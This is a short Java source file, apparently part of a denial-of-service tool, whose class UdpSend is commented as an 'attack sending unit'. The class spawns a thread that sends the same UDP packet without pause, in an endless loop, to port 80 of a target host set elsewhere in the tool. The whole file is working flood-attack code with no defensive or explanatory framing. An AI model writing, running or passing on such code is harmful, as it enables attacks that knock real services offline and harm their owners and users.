package com.zhanyingwl.www;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

import static com.zhanyingwl.www.doConnect.getTargetHost;

public class UdpSend extends Thread { // 攻击发送单元
    static String UDPData = "";

    @Override
    public void run() {
        try {
            DatagramSocket ds = new DatagramSocket();
            InetAddress ip = InetAddress.getByName(getTargetHost);
            byte[] info = UDPData.getBytes();
            DatagramPacket p = new DatagramPacket(info, UDPData.length(), ip, 80);
            while (!Thread.currentThread().isInterrupted()) {
                ds.send(p);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}